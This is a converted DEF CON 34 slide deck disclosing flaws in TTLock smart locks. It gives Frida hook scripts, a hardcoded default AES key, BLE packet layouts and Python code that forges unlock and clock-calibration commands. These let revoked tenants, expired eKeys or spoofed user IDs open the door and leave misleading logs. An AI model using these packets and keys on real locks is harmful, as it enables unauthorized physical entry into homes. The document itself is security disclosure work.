---
title: "The Ghost Key Illusions of Time Management in TTLock Smart Locks"
speakers: ["Yang Liu", "Zhenghan Wang"]
conference: "DEF CON"
conference_full: "DEF CON 34"
edition: "34"
year: null
source_pdf: "DEF CON 34/DEF CON 34 - Yang Liu, Zhenghan Wang - The Ghost Key Illusions of Time Management in TTLock Smart Locks - V1.pdf"
pages: 81
sha256: "ab4e86266a39abb174a07bfe060aec7084332d2a5a9706d46e6f2dfe15ac3485"
text_chars: 31682
ocr_pages: 3
has_ocr: true
redacted_secrets: 0
companion_files: []
extractor: "pymupdf4llm 1.28.2 + tesseract"
converted_at: "2026-08-12T00:31:27Z"
---
# The Ghost Key Illusions of Time Management in TTLock Smart Locks

**Speakers:** Yang Liu, Zhenghan Wang  
**Conference:** DEF CON 34  
**Source:** `DEF CON 34/DEF CON 34 - Yang Liu, Zhenghan Wang - The Ghost Key Illusions of Time Management in TTLock Smart Locks - V1.pdf` (81 pages)

## Slide 1

**The Ghost Key: Illusions of "Time Management" in TTLock Smart Locks** _How Design Flaws in Offline Authorizations Allow Persistent Unauthorized Entry_ **Speaker: Zhenghan Wang, Yang Liu**

## Slide 2

# Overview

#### 1. Introduction 2. Analysis Process 3. The Vulnerability 4. Real World Exploit 5. Mitigation & Conclusion

## Slide 3

### **whoami Zhenghan Wang & Yang Liu**

- IoT & Embedded Security Researcher

• Reverse Engineering | Wireless Protocol Analysis | Cryptography Review

Research focus: Real-world attack surfaces in connected devices

## Slide 4

### **About TTLock Smart Locks Why TTLock for Security Research**

- The brand of my home lock is TTLock.

- My landlord told me: "The Keyboard Password can only be used once!"

- Driven by curiosity and professional sensitivity, my goal is to explore a way to unlock the door without the TTLock APP.

- Turning point: A strange double-unlocking incident. When two mobile phones tried to unlock the door at the same time, two "Unlocked" prompts sounded. Could there be a security issue?

TTLock APP eKey

Lock

## Slide 5

### **TTLock APP An electronic key management APP developed by Sciener Smart Technology**

###### Admin eKey Management

- **Add & Delete eKeys**

- **Add Devices**

- **Passcodes**

- **RFID Cards**

- **Remote Control (Gateway)**

- **Authorized Admin**

- **Settings (Lock name, Lock Time, Sound, Bluetooth broadcast, Lock configs...)**

Unlock methods

Add devices page

Administrator

## Slide 6

### **PCB Board of the Lock**

**FM17611: RFID Chip, Supporting ISO14443/ ISO15693 Protocol CSK14T: High-performance Self-capacitance Touch Chip**

**WTV380: Audio Interface Chip**

**OM6621E: High-quality Bluetooth Low Energy (BLE) Wireless Radio Chip (Core Component)**

- **CPU ARM Cortex-M4, Max 64MHz**

- **SRAM 40KB**

- **Serial Flash 4MB**

- **Support AES HW encryption, AES-128 key**

- **HW Random Number Generator**

## Slide 7

### **APP eKey APP eKey unlocking process**

Send unlock commands (range ≤15m)

- **Unpack BLE packages**

- **• Verification unlock permission**

- **• Send power-on signal to the motor**

Remote Control

Gateway

_This entire process is completed through the APP, so most of the logic is concentrated on the APP side, which is also our main research target._

## Slide 8

Analysis Process

## Slide 9

### **Analysis Obtain the target APP file by jailbreaking iPhone and decompile it**

iPhone:~ mobile% ps axu|grep TTLock mobile          2008   0.0  0.0        0      0   ??  ?s Sat05PM   0:00.00 /var/containers/Bundle/Application/ BE7DCCE0-37B7-4FB6-A281-C2114CD560C0/TTLock.app/TTLock

$ ls -lh TTLock

-rw-r-xr-x@ 1 user  staff   115M  1  8 09:21 TTLock

No protection, with
symbol information.

## Slide 10

### **frida hook scripts Capture Bluetooth packets by Frida tool**

###### _Capture the Bluetooth data sent by the APP to the lock._

var writeValue = CBPeripheral['- writeValue:forCharacteristic:type:']; Interceptor.attach(writeValue.implementation, {

onEnter: function(args) {

var data = new ObjC.Object(args[2]);          // send data var characteristic = new ObjC.Object(args[3]);

... } });

###### _Capture the Bluetooth data received by the APP to the lock._

var methodName = '- peripheral:didUpdateValueForCharacteristic:error:'; Interceptor.attach(method.implementation, { onEnter: function(args) { var c = new ObjC.Object(args[3]); var value = c.value();            // receive data ... } });

_Captured results:_

[iPhone::TTLock ]->

[<] [Notify] UUID: Manufacturer Name String Hex: 536369656e6572

[<] [Notify] UUID: Model Number String Hex: 534e383530332d5438302d57494649442d42454c4c2d5243492d4e57 [<] [Notify] UUID: Hardware Revision String Hex: 312e31

[<] [Notify] UUID: Firmware Revision String Hex: 372e322e31392e3235303932353033 [+] [Write] UUID: FFF2 Hex: 7f5a0501010001000145aa00e20d0a [<] [Notify] UUID: FFF4 Hex: 7f5a050302000f000154aa10f765764a1e22c3260de3c4673b532734e50d0a

...

## Slide 11

### **Analysis packets How are Bluetooth packets structured?**

Example pair: [Send] 7f5a050302000f000141aa10199c846fb2c5703f7564e30c4758e0319c0d0a [Recv] 7f5a050302000f000154aa107a04ae0c81643ab77b24f0bcc360f52f5d0d0a

Interesting Pattern Analysis Section! We have uncovered the secret behind it.

7f5a 050302000f0001 41 aa 10 7f5a 050302000f0001 54 aa 10 Header Version CMD Delimiter Length

Header Version

199c846fb2c5703f7564e30c4758e031 9c 0d0a 7a04ae0c81643ab77b24f0bcc360f52f 5d 0d0a Data CRC8/MAXIM Trailer

## Slide 12

### **Analysis packets How are Bluetooth packets structured?**

7f5a 050302000f0001 41 aa 10 199c846fb2c5703f7564e30c4758e031 • The Header, Delimiter, and Trailer remain unchanged

199c846fb2c5703f7564e30c4758e031 9c 0d0a

## Slide 13

### **Analysis packets How are Bluetooth packets structured?**

7f5a 050302000f0001 41 aa 10 199c846fb2c5703f7564e30c4758e031 9c 0d0a • The Header, Delimiter, and Trailer remain unchanged

## Slide 14

### **Analysis packets How are Bluetooth packets structured?**

7f5a 050302000f0001 41 aa

050302000f0001 41 aa 10 199c846fb2c5703f7564e30c4758e031 9c • The Header, Delimiter, and Trailer remain unchanged • The Version field remains unchanged in most cases, except during Bluetooth pairing.

199c846fb2c5703f7564e30c4758e031 9c 0d0a

## Slide 15

### **Analysis packets How are Bluetooth packets structured?**

7f5a 050302000f0001 41 aa

050302000f0001 41 aa 10 199c846fb2c5703f7564e30c4758e031 9c • The Header, Delimiter, and Trailer remain unchanged • The Version field remains unchanged in most cases, except during Bluetooth pairing. • The CMD field serves as the Bluetooth function command, analogous to a switch-case structure.

199c846fb2c5703f7564e30c4758e031 9c 0d0a

## Slide 16

### **Analysis packets How are Bluetooth packets structured?**

7f5a 050302000f0001 41 aa

050302000f0001 41 aa 10 199c846fb2c5703f7564e30c4758e031 9c • The Header, Delimiter, and Trailer remain unchanged • The Version field remains unchanged in most cases, except during Bluetooth pairing. • The CMD field serves as the Bluetooth function command, analogous to a switch-case structure.

199c846fb2c5703f7564e30c4758e031 9c 0d0a

• The Length field indicates the total length of the Data • The CRC8 field calculates the checksum from the Header field to the end of the Data

## Slide 17

### **Analysis Data Field The most important filed in packet**

199c846fb2c5703f7564e30c4758e031 **The content exhibits characteristics of AES-CBC encryption**

- **16-byte cycle**

- **Randomized data**

- **Calls to the AES encryption function** CCCrypt **were observed in IDA**

## Slide 18

###### _Hook the CCCrypt function using Frida_

### **Analysis Data Field The most important filed in packet**

199c846fb2c5703f7564e30c4758e031 **The content exhibits characteristics of AES-CBC encryption**

- **16-byte cycle**

- **Randomized data**

- **Calls to the AES encryption function** CCCrypt **were observed in IDA**

try { var lib = Process.getModuleByName("libcommonCrypto.dylib"); cccrypt = lib.findExportByName("CCCrypt"); console.log("[+] Found CCCrypt at: " + cccrypt); ... } if (cccrypt) { Interceptor.attach(cccrypt, { onEnter: function(args) { // Save arguments ... this.key = args[3]; this.iv = args[5]; ... var opStr = (this.op === 0) ? "Encrypt" : "Decrypt"; var algStr = (this.alg === 0) ? "AES" : "Alg-" + this.alg; console.log("\n--- CCCrypt " + opStr + " " + algStr + " ---");

console.log("Key (" + this.keyLen + " bytes):"); console.log(safeHexdump(this.key, this.keyLen)); console.log("IV:"); console.log(safeHexdump(this.iv, 16)); console.log("Data In (" + this.dataInLen + " bytes):"); console.log(safeHexdump(this.dataIn, this.dataInLen));

## Slide 19

###### _Hook the CCCrypt function using Frida_

try { var lib = Process.getModuleByName("libcommonCrypto.dylib"); cccrypt = lib.findExportByName("CCCrypt"); console.log("[+] Found CCCrypt at: " + cccrypt); ... } if (cccrypt) { Interceptor.attach(cccrypt, { onEnter: function(args) { // Save arguments ... this.key = args[3]; this.iv = args[5];

**Analysis Data Field The most important filed in packet**

199c846fb2c5703f7564e30c4758e031

this.key = args[3]; **The content exhibits characteristics of** this.iv = args[5]; **AES-CBC encryption** ... --- CCCrypt Encrypt AES --- **• 16-byte cycle** var opStr = (this.op === 0) ? "Encrypt" : "Decrypt"; Key (16 bytes): var algStr = (this.alg === 0) ? "AES" : "Alg-" + this.alg; **• Randomized data** console.log("\n--- CCCrypt " + opStr + " " + algStr + " 282ded110  82 45 2e 76 32 b4 5d cd c0 d4 8d 24 2c a5 bc 7b  .E.v2.]....$,..{ **• Calls to the AES encryption function** ---"); IV: console.log("Key (" + this.keyLen + " bytes):"); CCCrypt **were observed in IDA** 282ded110  82 45 2e 76 32 b4 5d cd c0 d4 8d 24 2c a5 bc 7b  .E.v2.]....$,..{            console.log(safeHexdump(this.key, this.keyLen)); console.log("IV:"); console.log(safeHexdump(this.iv, 16)); Data In (11 bytes): console.log("Data In (" + this.dataInLen + " bytes):"); 282cbe1d0  26 cd f0 4a 00 00 00 02 ac d3 0b                 &..J....... console.log(safeHexdump(this.dataIn, this.dataInLen)); ...

## Slide 20

### **Verification Decrypt Verify using AES key and IV**

###### Example pair:

[Send] 7f5a050302000f000141aa10199c846fb2c5703f7564e30c4758e0319c0d0a [Recv] 7f5a050302000f000154aa107a04ae0c81643ab77b24f0bcc360f52f5d0d0a

Encrypt Data

AES_Decrypt

199c846fb2c5703f7564e30c4758e031 7a04ae0c81643ab77b24f0bcc360f52f

**Key: 82 45 2e 76 32 b4 5d cd c0 d4 8d 24 2c a5 bc 7b iv    : 82 45 2e 76 32 b4 5d cd c0 d4 8d 24 2c a5 bc 7b**

## Slide 21

### **Verification Decrypt Verify using AES key and IV**

Example pair: [Send] 7f5a050302000f000141aa10199c846fb2c5703f7564e30c4758e0319c0d0a [Recv] 7f5a050302000f000154aa107a04ae0c81643ab77b24f0bcc360f52f5d0d0a

ALL Right!!!

Encrypt Data

199c846fb2c5703f7564e30c4758e031 7a04ae0c81643ab77b24f0bcc360f52f

AES_Decrypt

Decrypt Data 26CDF04A00000002ACD30B 41010061631B

**Key: 82 45 2e 76 32 b4 5d cd c0 d4 8d 24 2c a5 bc 7b iv    : 82 45 2e 76 32 b4 5d cd c0 d4 8d 24 2c a5 bc 7b**

## Slide 22

### **The AES Key Revealing the AES Key Delivery Logic**

- When is the key generated?

- How is it stored?

- When is it destroyed?

- Will it be leaked?

## Slide 23

### **The AES Key Revealing the AES Key Delivery Logic**

• When is the key generated?

## Slide 24

### **The AES Key Revealing the AES Key Delivery Logic**

##### • When is the key generated?

###### **Capture add admin BLE packets:**

[+] [Write] UUID: FFF2 Hex: 7f5a0501010001000145aa00e20d0a [<] [Notify] UUID: FFF4 Hex: 7f5a050302000f000154aa00840d0a [+] [Write] UUID: FFF2 Hex: 7f5a0503020001000119aa1026ed1d9258a1e428fcb48bb d1c0e5a46520d0a

[<] [Notify] UUID: FFF4 Hex: 7f5a050302000f000119aa20de37d8d433c6a5233f13285 445533971fc674a8ed6cba4e9e67eebe5966c89e6660d0a [+] [Write] UUID: FFF2 Hex: 7f5a050302000f000156aa10ca0799a4aa74d3dc

Initialize
"OK"
AES_Encrypt_with_default_key("SCIENER")
AES_Encrypt_with_default_key("The NEW key")
Transfer with new key

APP

Lock

## Slide 25

### **The AES Key Revealing the AES Key Delivery Logic**

**_The default key is hardcoded in the program_**

##### • When is the key generated? **Capture add admin BLE packets:**

[+] [Write] UUID: FFF2 Hex: 7f5a0501010001000145aa00e20d0a [<] [Notify] UUID: FFF4 Hex: 7f5a050302000f000154aa00840d0a [+] [Write] UUID: FFF2 Hex: 7f5a0503020001000119aa1026ed1d9258a1e428fcb48bb d1c0e5a46520d0a [<] [Notify] UUID: FFF4 Hex: 7f5a050302000f000119aa20de37d8d433c6a5233f13285 445533971fc674a8ed6cba4e9e67eebe5966c89e6660d0a

Initialize The default key: 987623e8a923a1bb3d9e7d0378124588

"OK" AES_Encrypt_with_default_key("SCIENER") AES_Encrypt_with_default_key("The NEW key") Transfer with new key

[+] [Write] UUID: FFF2 Hex:

7f5a050302000f000156aa10ca0799a4aa74d3dc

APP

Lock

## Slide 26

### **The AES Key Revealing the AES Key Delivery Logic**

**_The default key is hardcoded in the program_**

• When is the key generated? **Capture add admin BLE packets:**

[+] [Write] UUID: FFF2 Hex: 7f5a0501010001000145aa00e20d0a [<] [Notify] UUID: FFF4 Hex: 7f5a050302000f000154aa00840d0a [+] [Write] UUID: FFF2 Hex: 7f5a0503020001000119aa1026ed1d9258a1e428fcb48bb d1c0e5a46520d0a [<] [Notify] UUID: FFF4 Hex: 7f5a050302000f000119aa20de37d8d433c6a5233f13285 445533971fc674a8ed6cba4e9e67eebe5966c89e6660d0a [+] [Write] UUID: FFF2 Hex: 7f5a050302000f000156aa10ca0799a4aa74d3dc

Initialize The default key: 987623e8a923a1bb3d9e7d0378124588 "OK" AES_Encrypt_with_default_key("SCIENER") AES_Encrypt_with_default_key("The NEW key") Transfer with new key Got new key: F9CD6721308BDA8F17EC4DFDAFEEC16B APP Lock

Lock

## Slide 27

### **The AES Key Revealing the AES Key Delivery Logic**

• How is it stored?

**The AES key returned by the lock is sent to the TTLock cloud server. The AES key is then distributed from the cloud when the user login their account on mobile phone.**

POST /lock/room/binddingAdmin

Decoded post data

## Slide 28

### **The AES Key Revealing the AES Key Delivery Logic**

• When is it destroyed?

**Since the AES key is generated by the door lock, it means that it will only be destroyed when the administrator unbinds it.**

- Will it be leaked?

**Yes, Administrators and regular users use the same key. You can obtain this simply by capturing network packets during login.**

## Slide 29

# Now analyze the Bluetooth Commands.

## Slide 30

### **Debug and analyze Analyze Bluetooth commands**

console.log(Thread.backtrace(this.context, Backtracer.ACCURATE).map(DebugSymbol.fromAddress).join('\n'));

--- CCCrypt Encrypt AES --Key (16 bytes):

28074a250  f9 cd 67 21 30 8b da 8f 17 ec 4d fd af ee c1 6b  ..g!0.....M....k IV:

28074a250  f9 cd 67 21 30 8b da 8f 17 ec 4d fd af ee c1 6b  ..g!0.....M....k Data In (11 bytes):

28400d7f0  26 d2 fc 7b 00 00 00 02 ac d3 0b                 &..{....... Call Stack:

0x104f429b8 TTLock!-[NSData AES256EncryptWithKeyBytes:gIv:] 0x104f43d44 TTLock!+[SecurityUtil encryptAESData:keyBytes:]

By hooking the CCCrypt function via Frida, we identified its upper-layer function setDataAES.

0x104fcb5f0 TTLock!-[TTCommand setDataAES:withLength:key:]

- 0x104fa35e4 TTLock!+[TTCommandUtils v3_check_admin_with_ps:flag:userID:version:key:] 0x104f62eb0 TTLock!-[TTLock handleV3LockResponse:data:]

- 0x104f629f8 TTLock!-[TTLock handleV2AndV3LockResponse:]

- 0x104f6217c TTLock!-[TTLock handleCommandResponse:]

- 0x104f514ec TTLock!-[TTLock getData:]

0x104f50f80 TTLock!-[TTLock peripheral:didUpdateValueForCharacteristic:error:]

0x1b03c274c CoreBluetooth!-[CBPeripheral handleAttributeEvent:args:attributeSelector:delegateSelector:delegateFlag:] 0x1b03c2854 CoreBluetooth!-[CBPeripheral handleCharacteristicEvent:characteristicSelector:delegateSelector:delegateFlag:] 0x1b03bf6f4 CoreBluetooth!-[CBPeripheral handleMsg:args:]

0x1b038f3f0 CoreBluetooth!-[CBCentralManager handleMsg:args:]

0x1b038efc8 CoreBluetooth!-[CBManager xpcConnectionDidReceiveMsg:args:]

0x1b038eeb8 CoreBluetooth!__30-[CBXpcConnection _handleMsg:]_block_invoke

0x1990b2850 libdispatch.dylib!_dispatch_call_block_and_release

## Slide 31

### **Debug and analyze Analyze Bluetooth commands**

**Tracing up the setDataAES:withLength:key: function, we identified the key function setCommand: for constructing Bluetooth commands.**

## Slide 32

### **Debug and analyze Analyze Bluetooth commands**

**Tracing up the setDataAES:withLength:key: function, we identified the key function setCommand: for constructing Bluetooth commands.**

**This function is responsible for setting the CMD value of Bluetooth packets.**

## Slide 33

### **Debug and analyze Analyze Bluetooth commands**

**Tracing up the setDataAES:withLength:key: function, we identified the key function setCommand: for constructing Bluetooth commands.**

**This function is responsible for setting the CMD value of Bluetooth packets.**

7f5a 050302000f0001 41 aa 10

199c846fb2c5703f7564e30c4758e031 9c 0d0a

## Slide 34

### **TTCommand v3_xxx functions Analyze the Bluetooth commands**

|Get Device Characteristic|Modify Keyboard PWD|Lock Fetch Record Num|Fetch Lock AES Key|
|---|---|---|---|
|1|3|7|19|
|Check Random|Init Password|Check Admin PWD|Calibation Time|
|30|31|41|43|
|Lock Reset|Check User With Date|Add Admin With PWD|Get Lock Info|
|52|55|56|90|

......

## Slide 35

# What is the entire unlocking process?

## Slide 36

### **Admin Unlocking Process Only three Bluetooth packets need to be sent to unlock**

Initialize
45 NULL
54 450164
41 26D2FC7B00000002ACD30B
54 410110E32AC3
47 11ED294369A7E158
54 47016402ACD30B69A7E1581A03040F2539
Lock

Initialize

Check Admin

Unlock

APP

## Slide 37

### **Admin Unlocking Process Only three Bluetooth packets need to be sent to unlock**

Fetch Lock Detail Initialize 45 NULL 54 450164 Check Admin 41 26D2FC7B00000002ACD30B 54 410110E32AC3

Check Admin

Unlock

47 11ED294369A7E158

54 47016402ACD30B69A7E1581A03040F2539

Lock

APP

## Slide 38

### **Admin Unlocking Process Only three Bluetooth packets need to be sent to unlock**

Fetch Lock Detail Initialize 45 NULL CMD+TRUE+Battery 54 450164 Check Admin 41 26D2FC7B00000002ACD30B

Check Admin

54 410110E32AC3

Unlock

47 11ED294369A7E158

54 47016402ACD30B69A7E1581A03040F2539

Lock

APP

## Slide 39

### **Admin Unlocking Process Only three Bluetooth packets need to be sent to unlock**

Fetch Lock Detail Initialize 45 NULL CMD+TRUE+Battery <u>PWD+Flag+UID</u> Check Admin 41 26D2FC7B00000002ACD30B

Check Admin

54 450164

54 410110E32AC3

Unlock

47 11ED294369A7E158

54 47016402ACD30B69A7E1581A03040F2539

Lock

APP

## Slide 40

### **Admin Unlocking Process Only three Bluetooth packets need to be sent to unlock**

Fetch Lock Detail Initialize 45 NULL CMD+TRUE+Battery 54 450164 <u>PWD+Flag+UID</u> Check Admin 41 26D2FC7B00000002ACD30B ~~CMD+TRUE+Random~~ 54 410110E32AC3 Unlock 47 11ED294369A7E158 54 47016402ACD30B69A7E1581A03040F2539

Lock

APP

## Slide 41

### **Admin Unlocking Process Only three Bluetooth packets need to be sent to unlock**

Fetch Lock Detail Initialize 45 NULL CMD+TRUE+Battery <u>PWD+Flag+UID</u> Check Admin 41 26D2FC7B00000002ACD30B

Check Admin

54 450164

Unlock

47 11ED294369A7E158

~~CMD+TRUE+Random~~ 54 410110E32AC3 ~~Random resp+Timestamp~~ 54 47016402ACD30B69A7E1581A03040F2539

Lock

APP

## Slide 42

### **Admin Unlocking Process Only three Bluetooth packets need to be sent to unlock**

Fetch Lock Detail Initialize 45 NULL CMD+TRUE+Battery 54 450164 <u>PWD+Flag+UID</u> Check Admin 41 26D2FC7B00000002ACD30B ~~CMD+TRUE+Random~~ 54 410110E32AC3 ~~Random resp+Timestamp~~ Unlock 47 11ED294369A7E158 54 47016402ACD30B69A7E1581A03040F2539 CMD+TRUE+Battery+UID+Timestamp+Date **_Year-Month-Day-Hour-Minute-Second 26 - 03 - 04 - 15:37:57_**

Lock

APP

## Slide 43

**Three key elements for admin unlocking Admin password, UID and the Random number check**

- The admin UID is determined when registering a TTLock APP account.

**_0x02ACD30B_**

- The admin password is sent to the lock during lock binding.

• During the binding process, the lock generates and sends a random number. A fixed value is added to this random number, and the fixed value is stored in the lock.

[+] [Write] UUID: FFF2 Hex: 7f5a050302000f000156aa10ca0799a4aa74d3dcfd2f5b3fe6888c76d10d0a

Decrypt 26D2FC7B0109FE80534349454E4552

## Slide 44

**Three key elements for admin unlocking Admin password, UID and the Random number check**

- The admin UID is determined when registering a TTLock APP account.

**_0x02ACD30B_**

- The admin password is sent to the lock during lock binding.

- During the binding process, the lock generates and sends a random number. A fixed value is added to this random number, and the fixed value is stored in the lock.

- [+] [Write] UUID: FFF2 Hex: 7f5a050302000f000156aa10ca0799a4aa74d3dcfd2f5b3fe6888c76d10d0a

Decrypt
26D2FC7B0109FE80534349454E4552
54 410110E32AC3

47 11ED294369A7E158

## Slide 45

### **Ordinary User Unlocking Process Check user permission via the 0x55 Bluetooth command**

Initialize
45 NULL
54 450164
55 1A030410371B0304103700000002D06AEF
Check User by date
54 55011BBE42DE
Unlock 47 1CC8415E69A7F3FD
54 47016402D06AEF69A7F3FD1A0304103921
Lock

Check User by date

Unlock

APP

## Slide 46

**Ordinary User Unlocking Process Check user permission via the 0x55 Bluetooth command**

Initialize 45 NULL 54 450164 ~~StartDate+Expiration~~ 55 1A030410371B0304103700000002D06AEF Date+Flag+UID Check User by date 54 55011BBE42DE Unlock 47 1CC8415E69A7F3FD 54 47016402D06AEF69A7F3FD1A0304103921

Lock

APP

## Slide 47

**Ordinary User Unlocking Process Check user permission via the 0x55 Bluetooth command**

Initialize
45 NULL
Assigned by administ rator 54 450164
StartDate+Expiration
55 1A030410371B0304103700000002D06AEF Date+Flag+UID
Check User by date
54 55011BBE42DE
Unlock 47 1CC8415E69A7F3FD
54 47016402D06AEF69A7F3FD1A0304103921
Lock

APP

## Slide 48

### **Unlock without relying on the TTLock APP Everything is ready, unlock via a Python script**

###### **Python script unlock successful**

user_registration_date = '1A03041037' user_maturity_date = '1B03041037' user_id = '02D06AEF' raw_payload = bytes.fromhex(user_registration_date + user_maturity_date + '000000' + user_id) enc_payload = encrypt_aes(raw_payload) packet_head = bytes.fromhex('7f5a') version = bytes.fromhex('050302000f0001') ble_cmd = bytes.fromhex('55') sep = bytes.fromhex('aa') length = len(enc_payload).to_bytes(1, byteorder='big')

data_to_crc = packet_head + version + ble_cmd + sep + length + enc_payload crc_val = crc8_maxim(data_to_crc)

packet = data_to_crc + bytes([crc_val]) + bytes.fromhex('0d0a')

## Slide 49

The Vulnerabilities

## Slide 50

### **Threat Model Scenario How can a former tenant retain access to open the door?**

The administrator clicks "freeze/delete" on the management side, or the permission is automatically revoked when the time expires. Does our access truly disappear?

Guest

Administrator

## Slide 51

### **Threat Model Scenario How can a former tenant retain access to open the door?**

async def perform_check_user_by_date(self): user_registration_date = '1A03041037' user_maturity_date = '1B03041037' user_id = '02D06AEF'

# 1. raw payload and encrypt

raw_payload = bytes.fromhex(user_registration_date + user_maturity_date + '000000' + user_id) enc_payload = encrypt_aes(raw_payload)

# 2. build packet packet_head = bytes.fromhex('7f5a') version = bytes.fromhex('050302000f0001') ble_cmd = bytes.fromhex('55') sep = bytes.fromhex('aa')

length = len(enc_payload).to_bytes(1, byteorder='big')

# 3. calculate CRC

data_to_crc = packet_head + version + ble_cmd + sep + length + enc_payload crc_val = crc8_maxim(data_to_crc)

# 4. concat the full packet packet = data_to_crc + bytes([crc_val]) + bytes.fromhex('0d0a') **Delete eKey and rerun the script**

## Slide 52

### **Threat Model Scenario How can a former tenant retain access to open the door?**

async def perform_check_user_by_date(self): user_registration_date = '1A03041037' user_maturity_date = '1B03041037' user_id = '02D06AEF'

# 1. raw payload and encrypt

raw_payload = bytes.fromhex(user_registration_date + user_maturity_date + '000000' + user_id) enc_payload = encrypt_aes(raw_payload)

# 2. build packet packet_head = bytes.fromhex('7f5a') version = bytes.fromhex('050302000f0001') ble_cmd = bytes.fromhex('55') sep = bytes.fromhex('aa') length = len(enc_payload).to_bytes(1, byteorder='big')

# 3. calculate CRC

data_to_crc = packet_head + version + ble_cmd + sep + length + enc_payload crc_val = crc8_maxim(data_to_crc) # 4. concat the full packet packet = data_to_crc + bytes([crc_val]) + bytes.fromhex('0d0a') **The lock can still be unlocked**

## Slide 53

### **Threat Model Scenario How can a former tenant retain access to open the door?**

async def perform_check_user_by_date(self): user_registration_date = '1A03041037' user_maturity_date = '1B03041037' user_id = '00FB1FB1' # 1. raw payload and encrypt raw_payload = bytes.fromhex(user_registration_date + user_maturity_date + '000000' + user_id) enc_payload = encrypt_aes(raw_payload)

# 2. build packet packet_head = bytes.fromhex('7f5a') version = bytes.fromhex('050302000f0001') ble_cmd = bytes.fromhex('55') sep = bytes.fromhex('aa') length = len(enc_payload).to_bytes(1, byteorder='big') # 3. calculate CRC data_to_crc = packet_head + version + ble_cmd + sep + length + enc_payload crc_val = crc8_maxim(data_to_crc) **Unlock** # 4. concat the full packet packet = data_to_crc + bytes([crc_val]) + bytes.fromhex('0d0a') **Success.Never check UID**

## Slide 54

## **No logs No footprints Like a ghost**

## Slide 55

### **Fatal flaw of the eKey The eKey only verifies the expiration time**

**Lock Time: 2026-3-5 10:45:00**

eKey: 2026-03-04-16:55 2027-03-04-16:55

Start Time: 2026-03-04-16:55

End Time: 2027-03-04-16:55

## Slide 56

### **Fatal flaw of the eKey The eKey only verifies the expiration time Lock Time: 2026-3-5 10:45:00**

user_registration_date = '1901010000' user_maturity_date = '1902010000' user_id = '00FB1FB1' eKey: 2026-03-04-16:55 Start Date: 2025-01-01-00:00 2027-03-04-16:55 End Date: 2025-02-01-00:00

## Slide 57

### **Fatal flaw of the eKey The eKey only verifies the expiration time Lock Time: 2026-3-5 10:45:00**

user_registration_date = '1901010000' user_maturity_date = '1902010000' user_id = '00FB1FB1' eKey: 2026-03-04-16:55 Start Date: 2025-01-01-00:00 2027-03-04-16:55 End Date: 2025-02-01-00:00

user_registration_date = '1901010000' user_maturity_date = '1B03041037' user_id = '00FB1FB1' Start Date: 2025-01-01-00:00 End Date: 2027-03-04-16:55

## Slide 58

### **Fatal flaw of the eKey The eKey only verifies the expiration time**

###### **Lock Time: 2026-3-5 10:45:00**

user_registration_date = '1901010000' user_registration_date = '1901010000' user_maturity_date = '1902010000' user_maturity_date = '1B03041037' user_id = '00FB1FB1' user_id = '00FB1FB1' eKey: 2026-03-04-16:55 Start Date: 2025-01-01-00:00 Start Date: 2025-01-01-00:00 2027-03-04-16:55 End Date: 2025-02-01-00:00 End Date: 2027-03-04-16:55

user_registration_date = '0001010000' user_maturity_date = '630C1F173B' user_id = '00FB1FB1' Start Date: 2000-01-01-00:00 End Date: 2099-12-31-23:59

## Slide 59

**Fatal flaw of the eKey The eKey only verifies the expiration time**

**Lock Time: 2026-3-5 10:45:00**

**This is my house now.**

user_registration_date = '1901010000' user_maturity_date = '1902010000' user_id = '00FB1FB1'

eKey: 2026-03-04-16:55 Start Date: 2025-01-01-00:00 2027-03-04-16:55 End Date: 2025-02-01-00:00

user_registration_date = '1901010000' user_maturity_date = '1B03041037' user_id = '00FB1FB1'

Start Date: 2025-01-01-00:00 End Date: 2027-03-04-16:55

user_registration_date = '0001010000' user_maturity_date = '630C1F173B' user_id = '00FB1FB1'

Start Date: 2000-01-01-00:00 End Date: 2099-12-31-23:59

## Slide 60

### **Time Assassin Another problem: clock reversal**

**The user can obtain the current time through the app and calibrate the lock’s time via Bluetooth.**

## Slide 61

### **Time Assassin Modify lock time via APP**

Check user by date 55 0001010000630C1F173B00000002D06AEF Check Random 30 38B30DBB Calibrate Time 43 1A03050D3701

54 550137A90F3B 54 300164 54 430164

Lock

APP

## Slide 62

### **Time Assassin Modify lock time via APP**

Start Time+End Time+Flag+UID

Check user by date Time+Flag+UID 55 0001010000630C1F173B00000002D06AEF 54 550137A90F3B <u>Random Sum</u> Check Random 30 38B30DBB 54 300164 <u>26-03-05 13:55:01</u> Calibrate Time 43 1A03050D3701 54 430164

Lock

APP

## Slide 63

### **Time Assassin Modify lock time via APP**

Start Time+End Time+Flag+UID

Check user by date Time+Flag+UID 55 0001010000630C1F173B00000002D06AEF 54 550137A90F3B <u>Random Sum</u> Check Random 30 38B30DBB 54 300164 <u>26-03-05 13:55:01</u> **_~~When a user performs time calibration,~~_** Calibrate Time 43 1A03050D3701 **_the TTLock app will automatically set the validity period to per_** **_manent._** 54 430164

Lock

APP

## Slide 64

### **Time Assassin Modify lock time via APP**

Check user by date 55 0001010000630C1F173B00000002D06AEF 54 550137A90F3B Check Random 30 38B30DBB 54 300164 <u>Change to: 25-01-01 9:00:00</u> Calibrate Time 43 190101090000 54 430164

54 550137A90F3B

Lock

APP

## Slide 65

### **Time Assassin Modify lock time via Python script**

Check user by date 55 0001010000630C1F173B00000002D06AEF 54 550137A90F3B Check Random 30 38B30DBB **~~So what's the point,~~** **then?** 54 300164 <u>Change to: 25-01-01 9:00:00</u> Calibrate Time 43 190101090000 54 430164

Lock

APP

## Slide 66

### **About the Keyboard Password Password expired and unable to use? Not true!**

**Administrator sets keyboard password: 654321 End Time: 2026-03-05 15:00** Now is 14:51 Expires in 9 minutes...

## Slide 67

### **The Keyboard Password Password expired and unable to use? Not true!**

The keyboard password has expired after 9 minutes.

## Slide 68

### **The Keyboard Password Password expired and unable to use? Not true!**

The keyboard password has expired after 9 minutes. We modify the lock time to fall within the effective time window via a Python script. **Change this value to 2026-03-05 14:55:00**

raw_payload = bytes.fromhex('1a03050e3700') enc_payload = encrypt_aes(raw_payload)

packet_head = bytes.fromhex('7f5a') version = bytes.fromhex('050302000f0001') ble_cmd = bytes.fromhex('43') sep = bytes.fromhex('aa') length = len(enc_payload).to_bytes(1, byteorder='big')

data_to_crc = packet_head + version + ble_cmd + sep + length + enc_payload crc_val = crc8_maxim(data_to_crc)

packet = data_to_crc + bytes([crc_val]) + bytes.fromhex('0d0a')

## Slide 69

### **The Keyboard Password Password expired and unable to use? Not true!**

Unlocked! The keyboard password still works.

## Slide 70

### **Alibi for the perfect crime “Check your logs. I’m not in them.”**

Set the lock time to 2027-01-01 9:00 and unlock once via the APP, an unlock record from the future will be generated.

